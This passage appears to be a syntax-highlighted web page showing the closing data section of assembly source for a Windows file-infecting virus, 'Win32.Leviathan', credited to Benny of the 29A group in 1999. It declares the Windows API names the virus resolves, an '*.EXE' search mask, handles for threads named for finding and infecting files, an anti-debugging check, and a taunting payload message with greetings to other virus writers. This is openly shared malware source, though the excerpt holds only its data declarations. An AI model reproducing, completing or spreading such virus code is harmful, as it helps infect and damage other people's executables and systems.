</span><span class="sc5">szCreateFileMappingA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMapViewOfFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szUnmapViewOfFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szCloseHandle</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szSetFilePointer</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szSetEndOfFile</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szSetFileTime</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szSetFileAttributesA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGetCurrentProcess</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetCurrentProcess'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGetPriorityClass</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetPriorityClass'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szSetPriorityClass</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetPriorityClass'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szLoadLibraryA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szFreeLibrary</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FreeLibrary'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">szIsDebuggerPresent</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IsDebuggerPresent'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMessageBoxA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">szExt</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">JumpToHost</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">szMsgTitle</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Win32.Leviathan (c) 1999 by Benny'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMsgText</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Hey stupid !'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'This is gonna be your nightmare...'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'30th generation of Leviathan is here... beware of me !'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Threads are stripped, ship is sinkin''...'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Greetz:'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Darkman/29A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Super/29A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Billy Belcebu/DDT'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'and all other 29Aers...'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Special greet:'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Arthur Rimbaud'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'New milenium is knockin on the door... '</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'New generation of viruses is here, nothing promised, no regret.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleW</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleW</span><span class="sc0">

</span><span class="sc5">ddAPIs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ddCreateThread</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddExitThread</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetVersion</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindFirstFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindNextFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindClose</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCreateFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddMapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCloseHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFilePointer</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetEndOfFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFileTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetCurrentProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetPriorityClass</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetPriorityClass</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddLoadLibraryA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFreeLibrary</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ddThreadID</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">NHandles</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">hNeuron_Debugger</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hNeuron_Find</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hNeuron_CheckFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hNeuron_OpenFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hNeuron_CloseFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hNeuron_InfectFile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hNeuron_GetVersion</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">hFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hMapFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lpFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">K32Handle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD</span><span class="sc0">     </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virtual_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
